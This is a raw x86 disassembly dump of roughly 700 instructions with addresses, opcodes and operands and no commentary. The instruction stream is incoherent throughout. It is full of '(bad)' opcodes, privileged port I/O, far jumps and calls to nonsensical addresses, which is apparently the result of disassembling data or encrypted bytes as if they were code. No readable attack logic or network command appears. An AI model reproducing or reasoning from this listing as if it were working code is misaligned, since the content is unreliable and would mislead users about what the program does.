  412087:	inc    ebx
  412089:	or     eax,0x75a601e7
  41208e:	sub    bl,BYTE PTR [eax-0x15be2a8b]
  412094:	push   es
  412095:	sbb    al,0x2d
  412097:	loope  0x4120ff
  412099:	xchg   edx,eax
  41209a:	cld    
  41209b:	adc    al,0x42
  41209d:	into   
  41209e:	inc    edi
  41209f:	les    edx,FWORD PTR [ecx+0xf]
  4120a2:	sar    DWORD PTR [edx],0xb0
  4120a5:	ja     0x4120f7
  4120a7:	jnp    0x41202b
  4120a9:	xor    al,0xc0
  4120ab:	nop
  4120ac:	inc    ecx
  4120ad:	lea    ebx,[edi]
  4120af:	jb     0x4120a4
  4120b1:	test   BYTE PTR [ebx+0x29cbe44a],0xd7
  4120b8:	int3   
  4120b9:	aaa    
  4120ba:	push   ecx
  4120bb:	mov    dh,0xf9
  4120bd:	xor    DWORD PTR ds:[edx+0x42d51fbf],ebp
  4120c4:	pop    edi
  4120c5:	imul   ebx,DWORD PTR [edx-0x37],0xc8039aae
  4120cc:	adc    bh,dh
  4120ce:	dec    ebx
  4120cf:	xor    edi,0x46d3dc1f
  4120d5:	(bad)  [ecx+esi*1-0x3e1bdced]
  4120dc:	popf   
  4120dd:	imul   edi,DWORD PTR [edx+0x512f7b02],0x17
  4120e4:	xor    eax,0xc12277dd
  4120e9:	out    dx,al
  4120ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120eb:	adc    DWORD PTR [esi],0xa5bc3e5f
  4120f1:	mov    bh,BYTE PTR [edx]
  4120f3:	mov    eax,0xd7eb9625
  4120f8:	into   
  4120f9:	scas   al,BYTE PTR es:[edi]
  4120fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120fb:	js     0x41208a
  4120fd:	cld    
  4120fe:	mov    bl,0x39
  412100:	push   0x2c
  412102:	xchg   esp,eax
  412103:	pop    esi
  412104:	mov    cl,0x59
  412106:	dec    ecx
  412107:	cdq    
  412108:	jno    0x4120f9
  41210a:	mov    DWORD PTR [esi],ebx
  41210c:	mov    bh,bh
  41210e:	nop
  41210f:	dec    esi
  412110:	xor    DWORD PTR [esi],edi
  412112:	pushf  
  412113:	sub    al,0xa6
  412115:	fsub   DWORD PTR [edx]
  412117:	sbb    eax,0x88f86125
  41211c:	push   esp
  41211d:	(bad)  
  41211e:	cmp    BYTE PTR [ecx-0x652bdd28],cl
  412124:	jns    0x4121a3
  412126:	adc    BYTE PTR [ecx],dh
  412128:	retf   0x521d
  41212b:	mov    ecx,0x73e32a02
  412130:	sbb    DWORD PTR [ebx],esp
  412132:	push   cs
  412133:	les    esi,FWORD PTR [eax-0x9]
  412136:	xor    eax,0xd624dc99
  41213b:	out    dx,al
  41213c:	add    BYTE PTR [ecx+0x619c31d3],cl
  412142:	mov    ebx,0xd12569c9
  412147:	mov    eax,ds:0xbdcf8ac7
  41214c:	das    
  41214d:	(bad)  
  41214e:	aad    0xc0
  412150:	ror    DWORD PTR [eax-0x38],cl
  412153:	arpl   WORD PTR [esp+edi*1],bp
  412156:	jge    0x41216d
  412158:	xor    ebp,ebx
  41215a:	jmp    0xd6738cc9
  41215f:	ds fdivr st(3),st
  412162:	mov    dh,0x14
  412164:	ins    DWORD PTR es:[edi],dx
  412165:	mov    WORD PTR [edx+esi*1-0x2b],ss
  412169:	jbe    0x412158
  41216b:	aaa    
  41216c:	sti    
  41216d:	pop    esp
  41216e:	xchg   ecx,eax
  41216f:	ins    DWORD PTR es:[edi],dx
  412170:	ins    BYTE PTR es:[edi],dx
  412171:	sbb    eax,0x76279e8d
  412176:	push   eax
  412177:	dec    edx
  412178:	cmp    esp,DWORD PTR [edi]
  41217a:	call   0x81305380
  41217f:	in     al,0xb4
  412181:	jmp    0xded7490b
  412186:	(bad)  
  412187:	mov    bh,0x13
  412189:	(bad)
  41218c:	aas    
  41218d:	lahf   
  41218e:	enter  0xe1b0,0xb4
  412192:	or     DWORD PTR [ebp+0x4126ed83],esi
  412198:	jp     0x41212b
  41219a:	mov    edx,DWORD PTR [ebx+0x9]
  41219d:	adc    eax,0xd2076770
  4121a2:	es add eax,0x486d8f97
  4121a8:	mov    edx,0xdb23ce06
  4121ad:	js     0x4121bc
  4121af:	mov    eax,0x8f3534a4
  4121b4:	xor    al,0xf2
  4121b6:	data16 xor al,0xf5
  4121b9:	pop    ebx
  4121ba:	or     DWORD PTR [eax+0x1a0bd040],ebx
  4121c0:	fsubp  st(1),st
  4121c2:	mov    bh,0x53
  4121c4:	pop    ecx
  4121c5:	mov    edx,0xd6686305
  4121ca:	outs   dx,DWORD PTR ds:[esi]
  4121cb:	add    ebx,DWORD PTR [esi+0x54194eb]
  4121d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d2:	cwde   
  4121d3:	add    BYTE PTR [esi+0x35],ah
  4121d6:	mov    ah,0x1a
  4121d8:	scas   al,BYTE PTR es:[edi]
  4121d9:	jno    0x4121f6
  4121db:	add    al,0xf4
  4121dd:	xchg   ecx,eax
  4121de:	and    eax,DWORD PTR [edi-0x5d831e0b]
  4121e4:	or     al,ah
  4121e6:	fcom   QWORD PTR [esi+eiz*1-0x6b]
  4121ea:	or     bl,bl
  4121ec:	cmp    al,0xd1
  4121ee:	fadd   DWORD PTR [ebp-0x5b]
  4121f1:	jae    0x412201
  4121f3:	(bad)  
  4121f4:	loopne 0x412196
  4121f6:	sbb    al,0x6e
  4121f8:	test   BYTE PTR [ebp+0x4c9f00c6],bh
  4121fe:	jle    0x41224c
  412200:	out    0x89,al
  412202:	test   DWORD PTR [esi],ebp
  412204:	push   0x59
  412206:	jnp    0x412269
  412208:	(bad)  
  41220b:	adc    DWORD PTR [eax+0x91c6ee9],ebp
  412211:	ror    DWORD PTR [edi+0x324b6b86],cl
  412217:	out    0x83,al
  412219:	lods   eax,DWORD PTR ds:[esi]
  41221a:	ret    0x52b3
  41221d:	(bad)  [esi-0x4a]
  412220:	jecxz  0x41220e
  412222:	retf   0x9c56
  412225:	retf   0xc058
  412228:	sbb    ebp,DWORD PTR ss:0x17c016f6
  41222f:	jb     0x412247
  412231:	ins    DWORD PTR es:[edi],dx
  412232:	dec    edi
  412233:	mov    eax,ds:0x9f80ee28
  412238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412239:	inc    eax
  41223a:	mov    ebp,0xd8bafac8
  41223f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412240:	jbe    0x4121d5
  412242:	ja     0x412299
  412244:	or     dh,BYTE PTR [ecx]
  412246:	add    eax,0x51ab5559
  41224b:	mov    ch,0x98
  41224d:	jg     0x4122b7
  41224f:	mov    eax,0x66c1baf0
  412254:	outs   dx,BYTE PTR ds:[esi]
  412255:	loop   0x4122bc
  412257:	sti    
  412258:	out    dx,al
  412259:	sub    edx,DWORD PTR [edi]
  41225b:	and    al,0x3c
  41225d:	mov    ah,BYTE PTR [edx]
  41225f:	mov    edi,0xf63fda4c
  412264:	and    bh,BYTE PTR [eax-0x61b621f8]
  41226a:	shl    BYTE PTR [edi],0x78
  41226d:	(bad)  
  41226e:	xlat   BYTE PTR ds:[ebx]
  41226f:	(bad)
  412272:	stos   BYTE PTR es:[edi],al
  412273:	adc    BYTE PTR [esi],bl
  412275:	ins    BYTE PTR es:[edi],dx
  412276:	mov    al,0x6e
  412278:	sub    al,0xf0
  41227a:	pop    ecx
  41227b:	cmp    eax,0x68f783d6
  412280:	sbb    eax,DWORD PTR [eax+ebp*8-0x45]
  412284:	push   ds
  412285:	shl    BYTE PTR [ecx+0x7bd3b79],0xb6
  41228c:	test   al,0xed
  41228e:	scas   eax,DWORD PTR es:[edi]
  41228f:	push   es
  412290:	jp     0x4122f5
  412292:	aas    
  412293:	shl    BYTE PTR [edi+0x694ab191],0xba
  41229a:	shl    BYTE PTR [ecx-0x30fdcdab],1
  4122a0:	push   edx
  4122a1:	mov    al,ds:0x3844b51c
  4122a6:	inc    edi
  4122a7:	adc    DWORD PTR ds:0x20694b6e,esp
  4122ad:	jno    0x4122f7
  4122af:	push   ecx
  4122b0:	adc    BYTE PTR [ebp+0x2a8c3372],bh
  4122b6:	pushf  
  4122b7:	inc    edx
  4122b8:	ds jno 0x4122d3
  4122bb:	test   DWORD PTR [edx],ebp
  4122bd:	push   0xec61d7ec
  4122c2:	inc    esi
  4122c3:	jo     0x412301
  4122c5:	xor    eax,0x287e450f
  4122ca:	scas   al,BYTE PTR es:[edi]
  4122cb:	cwde   
  4122cc:	gs inc ecx
  4122ce:	outs   dx,DWORD PTR ds:[esi]
  4122cf:	xor    ecx,DWORD PTR [edi]
  4122d1:	jo     0x412255
  4122d3:	pop    ebx
  4122d4:	sub    al,BYTE PTR [eax]
  4122d6:	lods   eax,DWORD PTR ds:[esi]
  4122d7:	(bad)  
  4122d8:	in     eax,dx
  4122d9:	dec    esp
  4122da:	sub    al,0x31
  4122dc:	dec    esi
  4122dd:	ja     0x412323
  4122df:	into   
  4122e0:	adc    dl,dl
  4122e2:	dec    edx
  4122e3:	pop    ecx
  4122e4:	leave  
  4122e5:	adc    ebx,DWORD PTR [ebx]
  4122e7:	mov    al,0xa1
  4122e9:	jecxz  0x4122ed
  4122eb:	jecxz  0x41228e
  4122ed:	in     eax,0xc6
  4122ef:	pop    DWORD PTR [edx+0xe554c3a]
  4122f5:	ja     0x412329
  4122f7:	sub    edx,esp
  4122f9:	(bad)
  4122fd:	and    BYTE PTR [edx-0x6eea73c8],bh
  412303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412304:	popa   
  412305:	inc    ecx
  412306:	inc    eax
  412307:	mov    esp,0x887d7451
  41230c:	pop    ecx
  41230d:	xor    eax,0x67364641
  412312:	or     eax,0x39a10705
  412317:	dec    ebp
  412318:	loopne 0x4122ae
  41231a:	add    cl,BYTE PTR ds:[esi]
  41231d:	ins    DWORD PTR es:[edi],dx
  41231e:	or     eax,0xc6e3c70f
  412323:	push   ecx
  412324:	mov    WORD PTR [ecx],?
  412326:	cmp    al,0xda
  412328:	sub    eax,0x98ce33bb
  41232d:	sub    BYTE PTR [esi-0x58],cl
  412330:	outs   dx,BYTE PTR ds:[esi]
  412331:	xchg   ebx,eax
  412332:	pop    es
  412333:	inc    edx
  412334:	xchg   ebp,eax
  412335:	mov    ah,0x1
  412337:	enter  0x76f8,0xc5
  41233b:	adc    DWORD PTR [edi+0x4f],0xb6b159b1
  412342:	ins    DWORD PTR es:[edi],dx
  412343:	fucomip st,st(2)
  412345:	push   es
  412346:	xchg   edx,eax
  412347:	in     eax,dx
  412348:	icebp  
  412349:	shr    BYTE PTR [eax-0x557faadb],0x9f
  412350:	mov    cl,0x2f
  412352:	ds push edx
  412354:	add    BYTE PTR [esp+eiz*2+0x2e],ch
  412358:	out    0x32,eax
  41235a:	and    eax,0xcb11c973
  41235f:	jmp    0x4db1:0x59b65076
  412366:	push   edi
  412367:	call   0x310760cf
  41236c:	push   eax
  41236d:	hlt    
  41236e:	and    bh,ch
  412370:	mov    ds:0xed658d33,al
  412375:	call   0x2e7f1323
  41237a:	mov    dl,0x7d
  41237c:	and    dl,ah
  41237e:	mov    DWORD PTR [ecx+eax*1+0x77],edx
  412382:	mov    al,0xfd
  412384:	sbb    edx,DWORD PTR [edx+0xa9b23fd]
  41238a:	pushf  
  41238b:	jp     0x4123cc
  41238d:	out    dx,eax
  41238e:	imul   eax,DWORD PTR [ebp+0x7f],0x6abf3a9b
  412395:	dec    ecx
  412396:	pop    ebx
  412397:	sub    BYTE PTR [ebx+0x3297355d],0x2d
  41239e:	cld    
  41239f:	pop    edx
  4123a0:	adc    DWORD PTR [esp+0x6102424e],eax
  4123a7:	cmc    
  4123a8:	inc    ecx
  4123a9:	mov    esi,0x6aedf0ce
  4123ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123af:	loopne 0x41240e
  4123b1:	sahf   
  4123b2:	cmp    dh,BYTE PTR [ecx-0x41]
  4123b5:	push   0xfffffffd
  4123b7:	sar    ebp,1
  4123b9:	out    0x64,eax
  4123bb:	outs   dx,BYTE PTR ds:[esi]
  4123bc:	gs push ds
  4123be:	and    BYTE PTR [ebx+0x5f446420],cl
  4123c4:	fmul   st(2),st
  4123c6:	test   al,0x4d
  4123c8:	ds inc eax
  4123ca:	es dec ebx
  4123cc:	mov    bh,0x7f
  4123ce:	les    edi,FWORD PTR [esi-0x7ebbfd44]
  4123d4:	stos   BYTE PTR es:[edi],al
  4123d5:	inc    edi
  4123d6:	xchg   edx,eax
  4123d7:	push   ebp
  4123d8:	push   ss
  4123d9:	sub    DWORD PTR [ebx-0x37f048ed],esp
  4123df:	shl    DWORD PTR [edi],0x22
  4123e2:	clc    
  4123e3:	sbb    BYTE PTR [ebp+0xbb1fecf],ch
  4123e9:	mov    al,dl
  4123eb:	mov    esi,ecx
  4123ed:	dec    ecx
  4123ee:	shl    BYTE PTR [ecx],0x6e
  4123f1:	sahf   
  4123f2:	cmp    dl,BYTE PTR [ecx-0x74]
  4123f5:	xchg   edx,eax
  4123f6:	int3   
  4123f7:	mov    DWORD PTR [ebx+0x37],eax
  4123fa:	push   ebx
  4123fb:	mov    ds:0x34ae49f9,al
  412400:	idiv   BYTE PTR [esi-0x5]
  412403:	mov    bh,0x2b
  412405:	and    BYTE PTR [ecx+0x73],ah
  412408:	dec    esi
  412409:	pop    DWORD PTR ds:0x7fef2176
  41240f:	(bad)  
  412410:	xchg   esp,eax
  412411:	push   esi
  412412:	shr    BYTE PTR [ecx+0x12],0x46
  412416:	fisttp WORD PTR [edi-0x11]
  412419:	pop    esp
  41241a:	push   ss
  41241b:	add    BYTE PTR [edx+0x5e],cl
  41241e:	jge    0x412441
  412420:	sub    DWORD PTR [edx-0x4d],eax
  412423:	fdivp  st(2),st
  412425:	xchg   ebx,eax
  412426:	and    DWORD PTR gs:[esi+0x2c70df5e],esp
  41242d:	xor    al,0xa3
  41242f:	bound  edx,QWORD PTR [edx]
  412431:	jp     0x4123c9
  412433:	stc    
  412434:	push   edx
  412435:	cdq    
  412436:	cmp    eax,0xc8c2cd99
  41243b:	sbb    al,0x2d
  41243d:	fldenv [esi]
  41243f:	into   
  412440:	neg    edx
  412442:	pusha  
  412443:	data16 (bad) 
  412445:	jl     0x412417
  412447:	cs retf 0xf96f
  41244b:	xchg   ebx,eax
  41244c:	dec    ebx
  41244d:	loop   0x4123ee
  41244f:	(bad)  
  412450:	outs   dx,BYTE PTR ds:[esi]
  412451:	nop
  412452:	int    0x2a
  412454:	add    BYTE PTR [ebx+0x64],0x28
  412458:	pop    es
  412459:	mov    cl,0x67
  41245b:	xchg   ecx,eax
  41245c:	and    edi,DWORD PTR [ebp+0x40]
  41245f:	mov    ds:0x4d1260b4,al
  412464:	or     DWORD PTR [edx-0x104487de],esp
  41246a:	aam    0x7a
  41246c:	loope  0x4124de
  41246e:	aas    
  41246f:	and    bh,BYTE PTR ds:0xd8e98e80
  412475:	(bad)  
  412476:	mov    gs:0xf89f4636,eax
  41247c:	push   esp
  41247d:	(bad)  
  41247e:	push   DWORD PTR ds:0xd1a74be
  412484:	mov    ah,0x69
  412486:	pop    esi
  412487:	fs scas al,BYTE PTR es:[edi]
  412489:	sbb    al,0xcf
  41248b:	je     0x41241a
  41248d:	push   esp
  41248e:	mov    cx,bp
  412491:	inc    edx
  412492:	shr    DWORD PTR [ebp+0x59],0xd7
  412496:	repnz inc edi
  412498:	and    BYTE PTR [ecx+eax*8+0x18],dl
  41249c:	in     al,0x9f
  41249e:	bound  ecx,QWORD PTR [ecx-0x6f]
  4124a1:	rol    BYTE PTR [edi],0xf0
  4124a4:	outs   dx,BYTE PTR ds:[esi]
  4124a5:	je     0x41245e
  4124a7:	xchg   edx,eax
  4124a8:	mov    ecx,0xdab392b3
  4124ad:	mov    bl,cl
  4124af:	xor    eax,0x2f4cc623
  4124b4:	jge    0x4124b1
  4124b6:	jmp    0xe0fab421
  4124bb:	fisubr DWORD PTR [esi-0x51828ee6]
  4124c1:	sub    eax,0xa7509214
  4124c6:	pop    ebx
  4124c7:	cli    
  4124c8:	mov    eax,ds:0xfa6b9c8d
  4124cd:	cmc    
  4124ce:	sbb    eax,0xc169d8fd
  4124d3:	or     al,cl
  4124d5:	adc    BYTE PTR [esi],bh
  4124d7:	into   
  4124d8:	nop
  4124d9:	inc    esi
  4124da:	push   cs
  4124db:	icebp  
  4124dc:	leave  
  4124dd:	mov    BYTE PTR [ebp+0x3091db0c],al
  4124e3:	add    ebp,edx
  4124e5:	push   ss
  4124e6:	popa   
  4124e7:	dec    ebx
  4124e8:	aas    
  4124e9:	mov    ebp,0xd62ea966
  4124ee:	nop
  4124ef:	xchg   esi,eax
  4124f0:	sub    BYTE PTR [edi+edi*1-0x49],bh
  4124f4:	jge    0x412554
  4124f6:	lods   al,BYTE PTR ds:[esi]
  4124f7:	cld    
  4124f8:	fld    DWORD PTR [eax-0x71b6e7df]
  4124fe:	add    ah,cl
  412500:	and    al,0x76
  412502:	mov    esi,0x378233f1
  412507:	or     dl,al
  412509:	dec    esi
  41250a:	fwait
  41250b:	adc    ebp,DWORD PTR fs:[esp+ebp*1+0xacbf202]
  412513:	shr    DWORD PTR [edx],1
  412515:	xchg   esp,eax
  412516:	cld    
  412517:	int    0xdc
  412519:	mov    bl,0xa9
  41251b:	jge    0x4124f6
  41251d:	cdq    
  41251e:	fnstcw WORD PTR fs:[eax]
  412521:	repnz pop edx
  412523:	jge    0x4124ce
  412525:	jo     0x412592
  412527:	fwait
  412528:	iret   
  412529:	dec    ebp
  41252a:	fistp  WORD PTR [ebp-0xbea1e]
  412530:	in     eax,0xd9
  412532:	mov    esp,DWORD PTR [ebx]
  412534:	retf   0x4436
  412537:	push   ss
  412538:	sbb    al,0xd9
  41253a:	data16 loop 0x4124be
  41253d:	jnp    0x412539
  41253f:	ins    BYTE PTR es:[edi],dx
  412540:	outs   dx,DWORD PTR ds:[esi]
  412541:	ret    0xfc42
  412544:	ror    bh,0x29
  412547:	sbb    al,0x69
  412549:	inc    edx
  41254a:	ss js  0x41255b
  41254d:	shl    DWORD PTR [edi+esi*1+0x2c],cl
  412551:	popa   
  412552:	pop    eax
  412553:	adc    esp,0xecfe55c
  412559:	sbb    esp,DWORD PTR ds:0xcabcb9b0
  41255f:	stos   BYTE PTR es:[edi],al
  412560:	push   ss
  412561:	lock pop eax
  412563:	fsubr  QWORD PTR [edi-0x2]
  412566:	mov    ch,0x7c
  412568:	(bad)  
  412569:	test   eax,0x31c6ac3
  41256e:	xor    edx,DWORD PTR [ebp+0x73]
  412571:	push   es
  412572:	push   ss
  412573:	cmp    al,0x65
  412575:	imul   esp,DWORD PTR [ebx+0x59],0xffffff83
  412579:	jmp    0xa944041b
  41257e:	cmp    ebx,esp
  412580:	fadd   DWORD PTR [ecx-0x6ee7be6b]
  412586:	sbb    DWORD PTR [edx],esp
  412588:	push   esp
  412589:	jbe    0x412587
  41258b:	push   ebp
  41258c:	jnp    0x41252a
  41258e:	lds    ecx,FWORD PTR [esp+ecx*8]
  412591:	lea    edi,[ebp+0x3d3bd9bc]
  412597:	sbb    BYTE PTR [edx-0x57],0x42
  41259b:	adc    ah,dh
  41259d:	in     eax,0x27
  41259f:	sbb    eax,0x4a5fba41
  4125a4:	ds sbb edi,ebp
  4125a7:	retf   0xa973
  4125aa:	adc    eax,0xbab1806e
  4125af:	sbb    al,0x41
  4125b1:	or     BYTE PTR [esi-0xa],cl
  4125b4:	jno    0x4125cc
  4125b6:	pxor   mm5,QWORD PTR [esi-0x17]
  4125ba:	icebp  
  4125bb:	loop   0x412629
  4125bd:	dec    ebp
  4125be:	ss gs sti 
  4125c1:	xor    al,0x90
  4125c4:	mov    bh,0x7a
  4125c6:	sub    cl,bh
  4125c8:	ret    0x77e0
  4125cb:	xchg   ebp,eax
  4125cc:	push   ebx
  4125cd:	das    
  4125ce:	mov    cl,0x4c
  4125d0:	data16 shl BYTE PTR [esi+ecx*2],cl
  4125d4:	nop
  4125d5:	pop    es
  4125d6:	sub    edx,DWORD PTR [ebx-0x38]
  4125d9:	add    eax,0x30271e79
  4125de:	(bad)  
  4125e0:	int3   
  4125e1:	mov    ebp,0x3d77932b
  4125e6:	retf   0x385d
  4125e9:	jo     0x4125fb
  4125eb:	cdq    
  4125ec:	and    DWORD PTR [edx+0x44da8e0d],eax
  4125f2:	arpl   WORD PTR ds:0x9cfc156f,sp
  4125f8:	sbb    BYTE PTR [ebp-0x7c],al
  4125fb:	fisttp QWORD PTR [ecx]
  4125fd:	push   0xb69240c5
  412602:	enter  0x870b,0x3f
  412606:	loopne 0x4125da
  412608:	iret   
  412609:	int    0xb1
  41260b:	add    al,0x42
  41260d:	push   DWORD PTR [ecx+edi*8]
  412610:	pop    ebp
  412611:	gs adc edx,esp
  412614:	push   eax
  412615:	aas    
  412616:	cmp    cl,bh
  412618:	shl    BYTE PTR [esi+0x5f0fdce5],0x64
  41261f:	out    dx,al
  412620:	dec    esp
  412621:	adc    DWORD PTR [ebx+0x72],edi
  412624:	ret    
  412625:	cmp    ebp,DWORD PTR [edx]
  412627:	mov    dh,0x7c
  412629:	inc    edx
  41262a:	fst    DWORD PTR [edx-0x199d4f37]
  412630:	int    0x9b
  412632:	and    eax,0xd69bbd12
  412637:	xor    bl,BYTE PTR [ebp-0x30]
  41263a:	rcr    DWORD PTR [esi+0x1e],0x22
  41263e:	retf   0xcb34
  412641:	and    al,0x7
  412643:	pushf  
  412644:	pushf  
  412645:	sti    
  412646:	jp     0x412670
  412648:	lea    ecx,[eax+0x59f5b792]
  41264e:	push   ss
  41264f:	and    esp,ebx
  412651:	std    
  412652:	ins    BYTE PTR es:[edi],dx
  412653:	pop    esp
  412654:	fsub   DWORD PTR [ecx+0x0]
  412657:	lds    ecx,FWORD PTR [edx]
  412659:	imul   ecx,DWORD PTR [ecx-0x410ef728],0xae30011e
  412663:	jno    0x41267b
  412665:	mov    bl,0xd6
  412667:	fwait
  412668:	cmp    al,0xb1
  41266a:	xor    DWORD PTR [ecx-0x122972e9],esi
  412670:	mov    esi,0xd1ebb0e3
  412675:	add    BYTE PTR [esp+ebp*4],ah
  412678:	test   ch,ah
  41267a:	fs fs jae 0x412616
  41267e:	call   0xb52b7ef0
  412683:	sub    DWORD PTR [edi-0x1b],edx
  412686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412687:	cs ret 0x7d4a
  41268b:	in     eax,dx
  41268c:	rcr    bl,cl
  41268e:	pop    edi
  41268f:	and    BYTE PTR [edx-0x65],dl
  412692:	pop    ebp
  412693:	loopne 0x412685
  412695:	repnz sbb DWORD PTR [esi],ecx
  412698:	ret    
  412699:	dec    ebp
  41269a:	les    esp,FWORD PTR [esi-0x313bcc93]
  4126a0:	xchg   esp,eax
  4126a1:	(bad)  
  4126a2:	stc    
  4126a3:	add    DWORD PTR [edi+0x29122749],edx
  4126a9:	fs and eax,0xe3cc33fd
  4126af:	jp     0x41267a
  4126b1:	in     eax,0x5c
  4126b3:	push   0xffffff8d
  4126b5:	push   ds
  4126b6:	pop    edx
  4126b7:	(bad)  
  4126b8:	aam    0x5b
  4126ba:	sub    al,bh
  4126bc:	pop    es
  4126bd:	inc    esp
  4126be:	ins    BYTE PTR es:[edi],dx
  4126bf:	into   
  4126c0:	inc    esi
  4126c1:	shr    DWORD PTR [esi],0xcb
  4126c4:	cs jne 0x4126f0
  4126c7:	retf   0x38bb
  4126ca:	mov    ds:0x5932b7c6,al
  4126cf:	xchg   esi,eax
  4126d0:	inc    esp
  4126d1:	xchg   edx,eax
  4126d2:	xchg   DWORD PTR [esi-0x58],eax
  4126d5:	adc    al,0xe5
  4126d7:	mov    dh,0xf8
  4126d9:	sti    
  4126da:	or     ah,BYTE PTR [eax-0x77d6f50d]
  4126e0:	jg     0x412672
  4126e2:	sbb    esi,DWORD PTR [edx+esi*8-0x74]
  4126e6:	mov    ch,0x8d
  4126e8:	icebp  
  4126e9:	aas    
  4126ea:	lods   al,BYTE PTR ds:[esi]
  4126eb:	push   eax
  4126ec:	jg     0x41275f
  4126ee:	aas    
  4126ef:	sbb    ch,0x97
  4126f2:	stc    
  4126f3:	jp     0x4126ec
  4126f5:	add    edx,edx
  4126f7:	fisttp DWORD PTR [edi-0x4d0349de]
  4126fd:	ror    DWORD PTR [ebx-0x5c],1
  412700:	xchg   edx,eax
  412701:	icebp  
  412702:	push   esp
  412703:	mov    eax,0x25029670
  412708:	not    ecx
  41270a:	(bad)  
  41270b:	mov    ebx,0x84b4c6b1
  412710:	and    DWORD PTR [edi],eax
  412712:	aaa    
  412713:	fwait
  412714:	or     DWORD PTR ds:0x3b7e668f,esp
  41271a:	pop    ebp
  41271b:	sbb    eax,0x4cad7b42
  412720:	push   edx
  412721:	shl    BYTE PTR [edi-0x4a],0x24
  412725:	icebp  
  412726:	jno    0x4126c9
  412728:	cmp    eax,0x52dfdda3
  41272d:	cmp    edx,ecx
  41272f:	adc    ebx,DWORD PTR [edx-0x105344c0]
  412735:	(bad)  
  412737:	mov    BYTE PTR [ebx+0x3adbb66d],bh
  41273d:	(bad)  
  41273f:	nop
  412740:	dec    DWORD PTR ds:0x77104f7
  412746:	sbb    eax,esp
  412748:	adc    ebx,DWORD PTR [edx-0x43]
  41274b:	lods   eax,DWORD PTR ds:[esi]
  41274c:	pop    es
  41274d:	adc    edi,DWORD PTR [ebp+0x43]
  412750:	jne    0x4127b8
  412752:	mov    BYTE PTR [ecx],bh
  412754:	sub    al,BYTE PTR [edi]
  412756:	xchg   ebp,eax
  412757:	sub    eax,0x90847c05
  41275c:	jl     0x4126fc
  41275e:	test   eax,0x5ff1a429
  412763:	xor    bh,BYTE PTR [ecx-0x7b695d1b]
  412769:	aas    
  41276a:	xchg   ecx,eax
  41276b:	adc    DWORD PTR [esi-0x65c6e4f7],0xffffff94
  412772:	(bad)  
  412773:	addr16 add al,0x30
  412776:	push   ds
  412777:	inc    esp
  412778:	in     eax,0x0
  41277a:	in     eax,dx
  41277b:	into   
  41277c:	mov    cl,0xb3
  41277e:	mov    al,ds:0xcffa9ef1
  412783:	mov    cs,WORD PTR [ebx+ecx*4-0x4bbbb398]
  41278a:	mov    ebp,0xfddf5bd
  41278f:	xchg   edx,eax
  412790:	cld    
  412791:	xlat   BYTE PTR ds:[ebx]
  412792:	mov    al,ds:0x68f120b7
  412797:	js     0x4127c6
  412799:	daa    
  41279a:	pop    eax
  41279b:	retf   
  41279c:	or     dl,BYTE PTR [edi-0x37]
  41279f:	ins    BYTE PTR es:[edi],dx
  4127a0:	push   eax
  4127a1:	adc    ecx,DWORD PTR [edi]
  4127a3:	leave  
  4127a4:	sub    DWORD PTR [ebx],esi
  4127a6:	pop    esi
  4127a7:	and    al,0x1b
  4127a9:	push   edi
  4127aa:	ins    BYTE PTR es:[edi],dx
  4127ab:	aad    0x83
  4127ad:	in     al,0xa9
  4127af:	clc    
  4127b0:	out    0xb3,al
  4127b2:	add    al,0x7a
  4127b4:	mov    ds:0xc2978eaf,al
  4127b9:	daa    
  4127ba:	jo     0x41277c
  4127bc:	fistp  QWORD PTR [edi]
  4127be:	dec    eax
  4127bf:	jle    0x4127c3
  4127c1:	jg     0x4127a9
  4127c3:	jp     0x412790
  4127c5:	fistp  WORD PTR [edx]
  4127c7:	inc    esp
  4127c8:	pop    edx
  4127c9:	dec    eax
  4127ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127cb:	gs jnp 0x412841
  4127ce:	outs   dx,DWORD PTR ds:[esi]
  4127cf:	psubusw mm7,QWORD PTR [ebx-0x64b03664]
  4127d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127d7:	xchg   ebp,eax
  4127d8:	cmp    BYTE PTR [edx],cl
  4127da:	cmp    al,0x2b
  4127dc:	gs icebp 
  4127de:	dec    ebp
  4127df:	inc    esp
  4127e0:	xchg   ebx,eax
  4127e1:	ss add al,0x91
  4127e4:	inc    edx
  4127e5:	ins    DWORD PTR es:[edi],dx
  4127e6:	pop    eax
  4127e7:	int3   
  4127e8:	jb     0x4127b6
  4127ea:	adc    ch,cl
  4127ec:	cdq    
  4127ed:	dec    esi
  4127ee:	xchg   ecx,eax
  4127ef:	rol    DWORD PTR gs:0x341c871f,0x10
  4127f7:	sub    BYTE PTR [ebx+0x26f50585],0xa0
  4127fe:	xchg   ebx,eax
  4127ff:	into   
  412800:	jp     0x41286c
  412802:	dec    ebx
  412803:	retf   
  412804:	push   es
  412805:	pop    eax
  412806:	push   esp
  412807:	je     0x412805
  412809:	shl    DWORD PTR [eax+0x32702b23],0x86
  412810:	jmp    FWORD PTR [edi+0x4abca111]
  412816:	std    
  412817:	lds    esp,FWORD PTR [ecx]
  412819:	sti    
  41281a:	xchg   BYTE PTR [ecx-0x36],ah
  41281d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41281f:	or     esp,ecx
  412821:	or     ah,bh
  412823:	aam    0x71
  412825:	fsubr  DWORD PTR [ecx-0x67311f44]
  41282b:	sbb    al,0x7d
  41282d:	mov    ch,0x83
  41282f:	mov    esi,?
  412831:	fcmovnbe st,st(0)
  412833:	in     eax,0xe8
  412835:	xchg   edx,eax
  412836:	push   esi
  412837:	sub    DWORD PTR [ebx+eiz*1],edi
  41283a:	jns    0x41284f
  41283c:	push   0xffffffce
  41283e:	pop    si
  412840:	nop
  412841:	js     0x4128b6
  412843:	adc    BYTE PTR [eax+0x64],0x9f
  412847:	jmp    0x23e4:0x6500deb2
  41284e:	ror    BYTE PTR [edi],0x34
  412851:	daa    
  412852:	push   eax
  412853:	mov    ebx,0x8abf7f2d
  412858:	sahf   
  412859:	fiadd  DWORD PTR [edi-0x62]
